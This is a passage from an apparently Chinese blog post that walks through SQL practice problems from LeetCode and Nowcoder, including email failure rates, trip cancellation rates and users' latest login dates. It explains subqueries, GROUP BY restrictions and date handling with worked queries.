id正常的接受用户，两个条件用<code>AND</code>连接，写成</p><blockquote><p>–  子查询（筛选出用户 id是正常的数据）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> email <span class="hljs-keyword">WHERE</span> send_id <span class="hljs-keyword">IN</span> ( <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">WHERE</span> is_blacklist = <span class="hljs-number">0</span>)<span class="hljs-keyword">AND</span> receive_id <span class="hljs-keyword">IN</span> ( <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">WHERE</span> is_blacklist = <span class="hljs-number">0</span>)</code></pre></div></blockquote><p>为了方便描述，我们将上面这个子查询得到的表给个别名a，在表a里所有的用户id都是正常id了。那么接下来只需要统计type字段中no_completed占的比例即可，那么在使用表a的情况下，统计no_completed占用比例可以这样写：</p><p><code>SUM(IF(type = 'no_completed',1,0))/COUNT(*)</code></p><p>上面里层的<code>IF()</code>语句中，如果type 等于’no_completed’则返回数值1，否则返回数值0</p><p>外层嵌套一个<code>SUM()/COUNT(*)</code>就可以实现统计发送失败的比例了（因为发送失败返回了1，所以用<code>SUM( )</code> ）</p><p>因为题目要求保留三位小数，所以外层还得套一个<code>ROUND(value,3)</code>函数，即：</p><p><code>ROUND(SUM(IF(type = 'no_completed',1,0))/COUNT(*),3)</code></p><p>那么，SQL逻辑为</p><blockquote><p>– SQL查询逻辑</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">date</span>,<span class="hljs-keyword">ROUND</span>(<span class="hljs-keyword">SUM</span>(<span class="hljs-keyword">IF</span>(<span class="hljs-keyword">type</span> = <span class="hljs-string">'no_completed'</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>))/<span class="hljs-keyword">COUNT</span>(*),<span class="hljs-number">3</span>) <span class="hljs-keyword">FROM</span>  a<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span></code></pre></div></blockquote><p>这里表a是用户id全为正常的一个子表，把这个子表的SQL语句拼接上去就完成了，完整SQL语句如下：</p><p>（注意，子表即子查询结果需要命名否则会报错，下面将子表命名为a）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-string">`date`</span>,<span class="hljs-keyword">ROUND</span>(<span class="hljs-keyword">SUM</span>(<span class="hljs-keyword">IF</span>(<span class="hljs-keyword">type</span> = <span class="hljs-string">'no_completed'</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>))/<span class="hljs-keyword">COUNT</span>(*),<span class="hljs-number">3</span>) <span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> email     <span class="hljs-keyword">WHERE</span> send_id <span class="hljs-keyword">IN</span> (        <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">FROM</span> <span class="hljs-string">`user`</span>        <span class="hljs-keyword">WHERE</span> is_blacklist = <span class="hljs-number">0</span>    )    <span class="hljs-keyword">AND</span> receive_id <span class="hljs-keyword">IN</span> (        <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">FROM</span> <span class="hljs-string">`user`</span>        <span class="hljs-keyword">WHERE</span> is_blacklist = <span class="hljs-number">0</span>    )) a<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span></code></pre></div><blockquote><p>拓展</p><p>在表名或字段名两边加上<kbd>`</kbd> 是用来防止占用特殊字符串</p><p>例如 <code>date</code>就防止date字段跟date函数冲突（加上了就明确表示date是字段而不是函数也不是特殊符号）</p></blockquote><h4 id="262-行程和用户（困难）"><a href="#262-行程和用户（困难）" class="headerlink" title="262. 行程和用户（困难）"></a><a href="https://leetcode-cn.com/problems/trips-and-users/" target="_blank" rel="noopener"><strong>262. 行程和用户</strong></a>（困难）</h4><blockquote><p>SQL架构</p><p>表：<code>Trips</code></p><div class="hljs code-wrapper"><pre><code class="hljs gherkin">+-------------+----------+|<span class="hljs-string"> Column Name </span>|<span class="hljs-string"> Type     </span>|+-------------+----------+|<span class="hljs-string"> Id          </span>|<span class="hljs-string"> int      </span>||<span class="hljs-string"> Client_Id   </span>|<span class="hljs-string"> int      </span>||<span class="hljs-string"> Driver_Id   </span>|<span class="hljs-string"> int      </span>||<span class="hljs-string"> City_Id     </span>|<span class="hljs-string"> int      </span>||<span class="hljs-string"> Status      </span>|<span class="hljs-string"> enum     </span>||<span class="hljs-string"> Request_at  </span>|<span class="hljs-string"> date     </span>|<span class="hljs-string">     </span><span class="hljs-string">+-------------+----------+</span><span class="hljs-string">Id 是这张表的主键。</span><span class="hljs-string">这张表中存所有出租车的行程信息。每段行程有唯一 Id ，其中 Client_Id 和 Driver_Id 是 Users 表中 Users_Id 的外键。</span><span class="hljs-string">Status 是一个表示行程状态的枚举类型，枚举成员为(‘completed’, ‘cancelled_by_driver’, ‘cancelled_by_client’) 。</span></code></pre></div><p>表：<code>Users</code></p><div class="hljs code-wrapper"><pre><code class="hljs crystal">+-------------+----------+| Column Name | Type     |+-------------+----------+| Users_Id    | int      || Banned      | <span class="hljs-class"><span class="hljs-keyword">enum</span>     |</span>| Role        | <span class="hljs-class"><span class="hljs-keyword">enum</span>     |</span>+-------------+----------+Users_Id 是这张表的主键。这张表中存所有用户，每个用户都有一个唯一的 Users_Id ，Role 是一个表示用户身份的枚举类型，枚举成员为 (‘client’, ‘driver’, ‘partner’) 。Banned 是一个表示用户是否被禁止的枚举类型，枚举成员为 (‘Yes’, ‘No’) 。</code></pre></div><p>写一段 SQL 语句查出 <code>"2013-10-01"</code> 至 <code>"2013-10-03"</code> 期间非禁止用户（<strong>乘客和司机都必须未被禁止</strong>）的取消率。非禁止用户即 Banned 为 No 的用户，禁止用户即 Banned 为 Yes 的用户。</p><p><strong>取消率</strong> 的计算方式如下：(被司机或乘客取消的非禁止用户生成的订单数量) / (非禁止用户生成的订单总数)。</p><p>返回结果表中的数据可以按任意顺序组织。其中取消率 <code>Cancellation Rate</code> 需要四舍五入保留 <strong>两位小数</strong> 。</p><p>查询结果格式如下例所示：</p><div class="hljs code-wrapper"><pre><code class="hljs sql">Trips 表：+<span class="hljs-comment">----+-----------+-----------+---------+---------------------+------------+</span>| Id | Client_Id | Driver_Id | City_Id | Status              | Request_at |+<span class="hljs-comment">----+-----------+-----------+---------+---------------------+------------+</span>| 1  | 1         | 10        | 1       | completed           | 2013-10-01 || 2  | 2         | 11        | 1       | cancelled_by_driver | 2013-10-01 || 3  | 3         | 12        | 6       | completed           | 2013-10-01 || 4  | 4         | 13        | 6       | cancelled_by_client | 2013-10-01 || 5  | 1         | 10        | 1       | completed           | 2013-10-02 || 6  | 2         | 11        | 6       | completed           | 2013-10-02 || 7  | 3         | 12        | 6       | completed           | 2013-10-02 || 8  | 2         | 12        | 12      | completed           | 2013-10-03 || 9  | 3         | 10        | 12      | completed           | 2013-10-03 || 10 | 4         | 13        | 12      | cancelled_by_driver | 2013-10-03 |+<span class="hljs-comment">----+-----------+-----------+---------+---------------------+------------+</span>Users 表：+<span class="hljs-comment">----------+--------+--------+</span>| Users_Id | Banned | Role   |+<span class="hljs-comment">----------+--------+--------+</span>| 1        | No     | client || 2        | Yes    | client || 3        | No     | client || 4        | No     | client || 10       | No     | driver || 11       | No     | driver || 12       | No     | driver || 13       | No     | driver |+<span class="hljs-comment">----------+--------+--------+</span>Result 表：+<span class="hljs-comment">------------+-------------------+</span>| Day        | Cancellation Rate |+<span class="hljs-comment">------------+-------------------+</span>| 2013-10-01 | 0.33              || 2013-10-02 | 0.00              || 2013-10-03 | 0.50              |+<span class="hljs-comment">------------+-------------------+</span>2013-10-01：  - 共有 4 条请求，其中 2 条取消。  - 然而，Id=2 的请求是由禁止用户（User_Id=2）发出的，所以计算时应当忽略它。  - 因此，总共有 3 条非禁止请求参与计算，其中 1 条取消。  - 取消率为 (1 / 3) = 0.332013-10-02：  - 共有 3 条请求，其中 0 条取消。  - 然而，Id=6 的请求是由禁止用户发出的，所以计算时应当忽略它。  - 因此，总共有 2 条非禁止请求参与计算，其中 0 条取消。  - 取消率为 (0 / 2) = 0.002013-10-03：  - 共有 3 条请求，其中 1 条取消。  - 然而，Id=8 的请求是由禁止用户发出的，所以计算时应当忽略它。  - 因此，总共有 2 条非禁止请求参与计算，其中 1 条取消。  - 取消率为 (1 / 2) = 0.50</code></pre></div></blockquote><p>简单来说就是去除掉禁止用户后，看取消率</p><p>那么，思路是先去除禁止用户，然后进行表连接并将取消操作转换为数值，最后求出比例即可</p><ol><li><p>去除禁止用户</p><blockquote><p>– 子查询（子表t1）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> Trips<span class="hljs-keyword">WHERE</span> Client_Id <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">IN</span> (<span class="hljs-keyword">SELECT</span> Users_Id <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">Users</span><span class="hljs-keyword">WHERE</span> Banned = <span class="hljs-string">'Yes'</span>)<span class="hljs-keyword">AND</span> Driver_Id <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">IN</span> (<span class="hljs-keyword">SELECT</span> Users_Id <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">Users</span><span class="hljs-keyword">WHERE</span> Banned = <span class="hljs-string">'Yes'</span>)</code></pre></div></blockquote><p>经过上述操作后，得到的数据是Trips表去除用户后的数据</p><p>上述子查询操作得到的结果给个表别名 t1，为了方便阅读，之后把子查询简单得用t1表示（如果想要SQL运行得补充完整）</p></li><li><p>将取消操作转换为数值</p><blockquote><p>– 取消操作转换为数值（子表t2）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span>  Request_at,<span class="hljs-keyword">IF</span>(<span class="hljs-keyword">Status</span> = <span class="hljs-string">'cancelled_by_client'</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">AS</span> status1, <span class="hljs-keyword">IF</span>(<span class="hljs-keyword">Status</span> = <span class="hljs-string">'cancelled_by_driver'</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">AS</span> status2<span class="hljs-keyword">FROM</span> t1<span class="hljs-keyword">WHERE</span> request_at <span class="hljs-keyword">BETWEEN</span> <span class="hljs-string">'2013-10-01'</span> <span class="hljs-keyword">AND</span> <span class="hljs-string">'2013-10-03'</span></code></pre></div></blockquote><p>这里把<strong>被用户取消</strong>和<strong>被司机取消</strong>的操作都转换为数值1，其他的换成0</p><p>WHERE条件放在外层也行，但是放在内层先过滤掉则速度会更快</p></li><li><p>计算比例</p><p>因为取消操作都换成1了，即每一条数据如果有取消操作，则在 status1 和 status2 这两个字段中有且只有一个1</p><p>那么相加再除以总行数即可</p><blockquote><p>– 查询逻辑</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> t2.Request_at,<span class="hljs-keyword">ROUND</span>( ( <span class="hljs-keyword">SUM</span>(t2.status1)+<span class="hljs-keyword">SUM</span>(t2.status2) )/<span class="hljs-keyword">COUNT</span>(*),<span class="hljs-number">2</span>)<span class="hljs-keyword">FROM</span> t2<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> Request_at</code></pre></div></blockquote></li></ol><p>完整SQL语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> t2.Request_at <span class="hljs-keyword">AS</span> <span class="hljs-keyword">Day</span>,<span class="hljs-keyword">ROUND</span>( ( <span class="hljs-keyword">SUM</span>(t2.status1)+<span class="hljs-keyword">SUM</span>(t2.status2) )/<span class="hljs-keyword">COUNT</span>(*),<span class="hljs-number">2</span>) <span class="hljs-keyword">AS</span> <span class="hljs-string">`Cancellation Rate`</span><span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span>  Request_at,            <span class="hljs-keyword">IF</span>(<span class="hljs-keyword">Status</span> = <span class="hljs-string">'cancelled_by_client'</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">AS</span> status1,             <span class="hljs-keyword">IF</span>(<span class="hljs-keyword">Status</span> = <span class="hljs-string">'cancelled_by_driver'</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">AS</span> status2    <span class="hljs-keyword">FROM</span> (        <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> Trips        <span class="hljs-keyword">WHERE</span> Client_Id <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">IN</span> (            <span class="hljs-keyword">SELECT</span> Users_Id <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">Users</span>            <span class="hljs-keyword">WHERE</span> Banned = <span class="hljs-string">'Yes'</span>        )        <span class="hljs-keyword">AND</span> Driver_Id <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">IN</span> (            <span class="hljs-keyword">SELECT</span> Users_Id <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">Users</span>            <span class="hljs-keyword">WHERE</span> Banned = <span class="hljs-string">'Yes'</span>        )    ) t1    <span class="hljs-keyword">WHERE</span> request_at <span class="hljs-keyword">BETWEEN</span> <span class="hljs-string">'2013-10-01'</span> <span class="hljs-keyword">AND</span> <span class="hljs-string">'2013-10-03'</span>) t2<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> Request_at</code></pre></div><h2 id="日期"><a href="#日期" class="headerlink" title="日期"></a>日期</h2><h4 id="SQL66-牛客每个人最近的登录日期-一-（简单）"><a href="#SQL66-牛客每个人最近的登录日期-一-（简单）" class="headerlink" title="SQL66 牛客每个人最近的登录日期(一)（简单）"></a><a href="https://www.nowcoder.com/practice/ca274ebe6eac40ab9c33ced3f2223bb2?tpId=82&amp;&amp;tqId=35084&amp;rp=1&amp;ru=/activity/oj&amp;qru=/ta/sql/question-ranking" target="_blank" rel="noopener"><strong>SQL66</strong> <strong>牛客每个人最近的登录日期(一)</strong></a>（简单）</h4><blockquote><p>描述</p><p>牛客每天有很多人登录，请你统计一下牛客每个用户最近登录是哪一天。</p><p>有一个登录(login)记录表，简况如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20200817/557336_1597652540640_64D4B3DE58C69D6263B209D2B1AB6393" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>第1行表示user_id为2的用户在2020-10-12使用了客户端id为1的设备登录了牛客网<br>。。。<br>第4行表示user_id为3的用户在2020-10-13使用了客户端id为2的设备登录了牛客网</p><p>请你写出一个sql语句查询每个用户最近一天登录的日子，并且按照user_id升序排序，上面的例子查询结果如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20201026/557336_1603700593855_F4BBCB1D5E81A508C2A06167DCF2F5ED" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>查询结果表明:<br>user_id为2的最近的登录日期在2020-10-13<br>user_id为3的最近的登录日期也是2020-10-13</p></blockquote><p>思路：因为是按用户分的，显然是<code>GROUP BY user_id</code>。在SQL中，可以用<code>MAX()</code>函数来取距离现在最近的时间（反之，用<code>MIN()</code>函数则可以取到最早之前的时间）。该题SQL语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-keyword">MAX</span>(<span class="hljs-built_in">date</span>) <span class="hljs-keyword">FROM</span> login<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> user_id</code></pre></div><h4 id="SQL67-牛客每个人最近的登录日期-二-（较难）"><a href="#SQL67-牛客每个人最近的登录日期-二-（较难）" class="headerlink" title="SQL67 牛客每个人最近的登录日期(二)（较难）"></a><a href="https://www.nowcoder.com/practice/7cc3c814329546e89e71bb45c805c9ad?tpId=82&amp;tags=&amp;title=&amp;difficulty=0&amp;judgeStatus=0&amp;rp=1" target="_blank" rel="noopener"><strong>SQL67</strong> <strong>牛客每个人最近的登录日期(二)</strong></a>（较难）</h4><blockquote><p>描述</p><p>牛客每天有很多人登录，请你统计一下牛客每个用户最近登录是哪一天，用的是什么设备.</p><p>有一个登录(login)记录表，简况如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20210106/557336_1609907092884/B7BB8B84A2534ED56DAB6420C6D02C42" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>第1行表示user_id为2的用户在2020-10-12使用了客户端id为1的设备登录了牛客网<br>。。。<br>第4行表示user_id为3的用户在2020-10-13使用了客户端id为2的设备登录了牛客网</p><p>还有一个用户(user)表，简况如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20200817/557336_1597652611050_C098FF7CF52D3DC2ECE5019F4E7A5E88" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>还有一个客户端(client)表，简况如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20200817/557336_1597652618264_F2C14AA3F53E74C2FE5A266283E56241" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>请你写出一个sql语句查询每个用户最近一天登录的日子，用户的名字，以及用户用的设备的名字，并且查询结果按照user的name升序排序，上面的例子查询结果如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20210106/557336_1609907127708/7B7FC5B3933D957E9FD6C914ACE1D91A" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>查询结果表明:<br>fh最近的登录日期在2020-10-13，而且是使用ios登录的<br>wangchao最近的登录日期也是2020-10-13，而且是使用ios登录的</p></blockquote><p>就这，还较难？跟上一题不是很像嘛？就加一个表连接把字段换一下不就完事？</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user.name, client.name, <span class="hljs-keyword">MAX</span>(login.date)<span class="hljs-keyword">FROM</span> login<span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">ON</span> user.id = login.user_id<span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">client</span> <span class="hljs-keyword">ON</span> client.id = login.client_id<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user.name<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> user.name</code></pre></div><p>我啪地一下，很快呀↑它就给我报答案错误了。。。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210808180239.png" srcset="/img/loading.gif" lazyload="" alt=""></p><blockquote><p><strong>考点：group by 子句常见错误：</strong><br><strong>select 子句中只能存在以下三种元素：常数、聚合函数、group by子句指定列(聚合键)</strong></p></blockquote><p>也就是用了<code>GROUP BY</code>，那么选择的字段里就只能有这三种类型：</p><ol><li>常数字段</li><li>聚合函数作用的字段</li><li>group by子句指定列(聚合键)</li></ol><p>看看上面有user.name, client.name, MAX(login.date)这三个字段，其中user.name是聚合键，MAX(login.date)使用了聚合函数，都没问题。而client.name既不是常数也没有聚合函数，更不是聚合键，所以不能带上这个字段。</p><p>看正确解法思路：既然没办法GROUP BY 后SELECT这么多字段，而且用户id和时间还是准确的（看上图运行结果，只是不符合GROUP BY后SELECT的字段才错误，也就是只有客户端是错误的），所以我们先拿到准去的 用户id 和 时间date</p><blockquote><p>– 子查询</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user_id, <span class="hljs-keyword">MAX</span>(<span class="hljs-built_in">date</span>) <span class="hljs-keyword">FROM</span> login <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id</code></pre></div></blockquote><p>然后将三个表连接</p><blockquote><p>– 三个表连接</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user.name,client.name,login.date<span class="hljs-keyword">FROM</span> login<span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">ON</span> login.user_id = user.id<span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">client</span> <span class="hljs-keyword">ON</span> login.client_id = client.id</code></pre></div></blockquote><p>三个表连接后考虑用WHERE来过滤得到符合条件的结果，要筛选出最近登录，只需要用<code>WHERE 字段名 IN</code>即可实现</p><p>因为这里是需要用户id和时间date两个字段来判断，所以写出来是<code>WHERE (user_id,date) IN (  子查询  )</code></p><p>（注意：因为WHERE IN 后面的不是一个子表，所以不需要也不可以给这里子查询加上表别名）</p><p>完整的SQL语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user.name,client.name,login.date<span class="hljs-keyword">FROM</span> login<span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">ON</span> login.user_id = user.id<span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">client</span> <span class="hljs-keyword">ON</span> login.client_id = client.id<span class="hljs-keyword">WHERE</span> (user_id,<span class="hljs-built_in">date</span>) <span class="hljs-keyword">IN</span> (<span class="hljs-keyword">SELECT</span> user_id, <span class="hljs-keyword">MAX</span>(<span class="hljs-built_in">date</span>) <span class="hljs-keyword">FROM</span> login<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id    )<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> user.name</code></pre></div><h4 id="SQL68-牛客每个人最近的登录日期-三-（较难）"><a href="#SQL68-牛客每个人最近的登录日期-三-（较难）" class="headerlink" title="SQL68 牛客每个人最近的登录日期(三)（较难）"></a><a href="https://www.nowcoder.com/practice/16d41af206cd4066a06a3a0aa585ad3d?tpId=82&amp;tags=&amp;title=&amp;difficulty=0&amp;judgeStatus=0&amp;rp=1" target="_blank" rel="noopener"><strong>SQL68</strong> <strong>牛客每个人最近的登录日期(三)</strong></a>（较难）</h4><blockquote><p>描述</p><p>牛客每天有很多人登录，请你统计一下牛客新登录用户的次日成功的留存率，<br>有一个登录(login)记录表，简况如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20201026/557336_1603701796116_54BBC7EED94F0CAAFEC8DB042BBBCD01" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>第1行表示user_id为2的用户在2020-10-12使用了客户端id为1的设备第一次新登录了牛客网<br>。。。</p><p>第4行表示user_id为3的用户在2020-10-12使用了客户端id为2的设备登录了牛客网</p><p>。。。</p><p>最后1行表示user_id为1的用户在2020-10-14使用了客户端id为2的设备登录了牛客网</p><p>请你写出一个sql语句查询新登录用户次日成功的留存率，即第1天登陆之后，第2天再次登陆的概率,保存小数点后面3位(3位之后的四舍五入)，上面的例子查询结果如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20200820/557336_1597903513290_CD24AA22EB7078641AEAF29B146D26FD" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>查询结果表明:</p><p>user_id为1的用户在2020-10-12第一次新登录了，在2020-10-13又登录了，算是成功的留存</p><p>user_id为2的用户在2020-10-12第一次新登录了，在2020-10-13又登录了，算是成功的留存</p><p>user_id为3的用户在2020-10-12第一次新登录了，在2020-10-13没登录了，算是失败的留存</p><p>user_id为4的用户在2020-10-13第一次新登录了，在2020-10-14没登录了，算是失败的留存</p><p>固次日成功的留存率为 2/4=0.5</p><p>(sqlite里查找某一天的后一天的用法是:date(yyyy-mm-dd, ‘+1 day’)，四舍五入的函数为round，sqlite 1/2得到的不是0.5，得到的是0，只有1*1.0/2才会得到0.5</p><p>mysql里查找某一天的后一天的用法是:DATE_ADD(yyyy-mm-dd,INTERVAL 1 DAY)，四舍五入的函数为round)</p></blockquote><ol><li><p>先取出新用户第二天的登录数据</p><blockquote><p>– 所有用户的第二天登录数据</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-built_in">DATE</span>(<span class="hljs-keyword">MIN</span>(<span class="hljs-built_in">date</span>)+<span class="hljs-number">1</span>) <span class="hljs-keyword">FROM</span> login <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id</code></pre></div></blockquote><p>这里有一个问题，因为如果是字符串类型的时间，例如<code>2020-10-12</code>对其用了<code>MIN( )</code>函数后，会变成<code>20201012</code>，为了的后续操作，我们需要对其套上<code>DATE()</code>函数使其变回<code>2020-10-12</code>这种日期格式。</p></li><li><p>再用子查询（老套路，还是<code>WHERE 字段名 IN</code>）</p><blockquote><p>– WHERE IN大法</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">COUNT</span>(*)<span class="hljs-keyword">FROM</span> login<span class="hljs-keyword">WHERE</span> (user_id,<span class="hljs-built_in">date</span>) <span class="hljs-keyword">IN</span> ( <span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-built_in">DATE</span>(<span class="hljs-keyword">MIN</span>(<span class="hljs-built_in">date</span>)+<span class="hljs-number">1</span>) <span class="hljs-keyword">FROM</span> login  <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id) </code></pre></div></blockquote></li><li><p>查询用户数</p><p>接下来获取用户数，需要用<code>DISTINCT</code>（字段前加上这个可以去重）</p><blockquote><p>– 用户数</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">COUNT</span>(<span class="hljs-keyword">DISTINCT</span> user_id) <span class="hljs-keyword">FROM</span> login</code></pre></div></blockquote></li><li><p>相除，并且用<code>ROUND(value,3)</code>保留三位小数</p></li></ol><p>最终SQL语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">ROUND</span>(<span class="hljs-keyword">COUNT</span>(*)/( <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">COUNT</span>(<span class="hljs-keyword">DISTINCT</span> user_id) <span class="hljs-keyword">FROM</span> login),<span class="hljs-number">3</span>)<span class="hljs-keyword">FROM</span> login<span class="hljs-keyword">WHERE</span> (user_id,<span class="hljs-built_in">date</span>) <span class="hljs-keyword">IN</span> (    <span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-built_in">DATE</span>(<span class="hljs-keyword">MIN</span>(<span class="hljs-built_in">date</span>)+<span class="hljs-number">1</span>) <span class="hljs-keyword">FROM</span> login     <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id)</code></pre></div><h4 id="SQL69-牛客每个人最近的登录日期-四-（较难）"><a href="#SQL69-牛客每个人最近的登录日期-四-（较难）" class="headerlink" title="SQL69 牛客每个人最近的登录日期(四)（较难）"></a><a href="https://www.nowcoder.com/practice/e524dc7450234395aa21c75303a42b0a?tpId=82&amp;tags=&amp;title=&amp;difficulty=0&amp;judgeStatus=0&amp;rp=1" target="_blank" rel="noopener"><strong>SQL69</strong> <strong>牛客每个人最近的登录日期(四)</strong></a>（较难）</h4><blockquote><h2 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h2><p>牛客每天有很多人登录，请你统计一下牛客每个日期登录新用户个数，<br>有一个登录(login)记录表，简况如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20200820/557336_1597903671918_2C3C4BF94A59FB9AEEA6FEA89DEE17C9" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>第1行表示user_id为2的用户在2020-10-12使用了客户端id为1的设备登录了牛客网，因为是第1次登录，所以是新用户<br>。。。<br>第4行表示user_id为2的用户在2020-10-13使用了客户端id为2的设备登录了牛客网，因为是第2次登录，所以是老用户<br>。。<br>最后1行表示user_id为4的用户在2020-10-15使用了客户端id为1的设备登录了牛客网，因为是第2次登录，所以是老用户</p><p>请你写出一个sql语句查询每个日期登录新用户个数，并且查询结果按照日期升序排序，上面的例子查询结果如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20200820/557336_1597903683115_47DE8F52D6F847E788BB9EF6279481C4" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>查询结果表明:<br>2020-10-12，有3个新用户(user_id为2，3，1)登录<br>2020-10-13，没有新用户登录<br>2020-10-14，有1个新用户(user_id为4)登录<br>2020-10-15，没有新用户登录</p></blockquote><p>这不比上一道题更简单吗？先筛选出(新用户id,日期date)，然后WHERE IN，再GROUP BY分组COUNT统计行数，我啪地一声很快…</p><blockquote><p>– 错误写法</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">date</span>,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">FROM</span> login<span class="hljs-keyword">WHERE</span> (user_id,<span class="hljs-built_in">date</span>) <span class="hljs-keyword">IN</span> ( <span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-keyword">MIN</span>(<span class="hljs-built_in">date</span>) <span class="hljs-keyword">FROM</span> login <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id)<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span></code></pre></div></blockquote><p>…就错了（这种情况没有得出新用户是0的情况，如图）</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210809015523.png" srcset="/img/loading.gif" lazyload="" 